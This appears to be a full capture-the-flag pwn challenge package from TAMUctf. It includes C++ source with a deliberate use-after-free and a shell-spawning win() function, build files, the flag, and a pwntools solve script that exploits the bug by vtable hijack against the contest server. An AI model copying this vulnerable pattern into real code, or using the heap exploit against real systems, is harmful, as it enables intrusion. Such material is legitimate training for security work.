{
    "ctf_sim.cpp": "#include <iostream>\n#include <string>\n#include <stdlib.h>\n\nusing std::cout, std::endl, std::cin;\n\nstruct challenges {\n    virtual void solve() {\n        cout << \"You solved a challenge!\" << endl;\n\n    }\n};\n\nstruct forensics : challenges {\n    void solve() override {\n        cout << \"You solved a forensics challenge by using strings and grepping for the flag!\" << endl;\n    }\n};\n\nstruct reversing : challenges {\n    void solve() override {\n        cout << \"You solved a reversing challenge by throwing angr at it!\" << endl;\n        \n    }\n};\n\nstruct pwn : challenges {\n    void solve() override {\n        cout << \"You solved a pwn challenge by keysmashing and being lucky!\" << endl;\n        \n    }\n};\n\nstruct web : challenges {\n    void solve() override {\n        cout << \"You solved a web challenge by copy and pasting payloadallthethings!\" << endl;\n        \n    }\n};\n\nstruct crypto : challenges {\n    void solve() override {\n        cout << \"You solved a crypto challenge with rsactftool!\" << endl;\n        \n    }\n};\n\nvoid win() {\n    system(\"/bin/sh\");\n}\n\nvoid* win_addr = (void*) &win;\n\nchallenges* downloaded [4];\n\nvoid downloadChallenge() {\n    int choice;\n    int index;\n\n    while (true) {\n        cout << \"DOWNLOAD A CHALLENGE\" << endl;\n        cout << \"Choose a category\" << endl;\n        cout << \"1. Forensics\" << endl;\n        cout << \"2. Reversing\" << endl;\n        cout << \"3. Pwn\" << endl;\n        cout << \"4. Web\" << endl;\n        cout << \"5. Crypto\" << endl;\n        cout << \"> \";\n        cin >> choice;\n\n        cout << \"Choose an index to save your challenge to (0-3)\" << endl;\n        cout << \"> \";\n        cin >> index;\n        \n        if ((choice >= 1 && choice <=5) && (index >= 0 && index <= 3)) {\n            break;\n        }\n        else {\n            cout << \"Invalid category or index\" << endl;\n        }\n    }\n\n    if (choice == 1) {\n        downloaded[index] = new forensics;\n    }\n    else if (choice == 2) {\n        downloaded[index] = new reversing;\n    }\n    else if (choice == 3) {\n        downloaded[index] = new pwn;\n    }\n    else if (choice == 4) {\n        downloaded[index] = new web;\n    }\n    else {\n        downloaded[index] = new crypto;\n    }\n\n}\n\nvoid solveChallenge() {\n    int index;\n    while (true) {\n        cout << \"SOLVE A CHALLENGE\" << endl;\n        cout << \"Choose one of your downloaded challenges (0-3)\" << endl;\n        cout << \"> \";\n        cin >> index;\n\n        if (index >= 0 && index <= 3) {\n            break;\n        }\n    }\n\n    downloaded[index] -> solve();\n    delete downloaded[index];\n\n}\n\nvoid submitWriteup() {\n    int length;\n    cout << \"SUBMIT A WRITEUP\" << endl;\n    cout << \"How long is your writeup?\" << endl;\n    cout << \"> \";\n    cin >> length;\n    cout << \"Enter your writeup\" << endl;\n    cout << \"> \";\n    cin.get();\n    char* writeup;\n    writeup = (char*) malloc(length);\n\n    fgets(writeup, length, stdin);   \n\n}\n\n\nint main() {\n    int choice;\n    while (true) {\n        cout << \"CTF SIM\" << endl;\n        cout << \"1. Download a Challenge\" << endl;\n        cout << \"2. Solve a Challenge\" << endl;\n        cout << \"3. Submit a writeup\" << endl;\n        cout << \"4. Quit\" << endl;\n        cout << \"> \";\n        cin >> choice;\n\n        if (choice >=1 && choice <= 4) {\n            if (choice == 1) {\n                downloadChallenge();\n            }\n            else if (choice == 2) {\n                solveChallenge();\n            }\n            else if (choice == 3) {\n                submitWriteup();\n            }\n            else {\n                exit(0);\n            }\n\n            \n        }\n    }\n\n\n\n}",
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.cpp /tmp/$name.cpp\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]",
    "flag.txt": "gigem{h34pl355_1n_53477l3}",
    "Makefile": "CC := g++\nCFLAGS := -std=c++17 -O0 -no-pie\nNAME := ctf_sim\nPORT := 7005\nall: $(NAME)\n\nclean: .PHONY\n\trm -f $(NAME)\n\n$(NAME): $(NAME).cpp\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).cpp solver-template.py\n\n.PHONY:\n",
    "README.md": "# CTF SIM \n## Description \nWanna take a break from the ctf to do another ctf?\n## Solution\nSee `solve.py`.",
    "solve.py": "from pwn import *\n\n\ne = ELF('./ctf_sim')\nwin_ptr = e.symbols['win_addr']\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"ctf-sim\")\n\np.sendline(b'1')\np.sendline(b'1')\np.sendline(b'0')\np.sendline(b'1')\np.sendline(b'2')\np.sendline(b'1')\np.sendline(b'2')\np.sendline(b'0')\n\np.sendline(b'3')\np.sendline(b'9')\np.sendline(p64(win_ptr))\n\np.sendline(b'3')\np.sendline(b'9')\np.sendline(p64(win_ptr))\n\np.sendline(b'2')\np.sendline(b'0')\n\np.interactive()\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"ctf-sim\")\np.interactive()\n",
    "category": "pwn"
}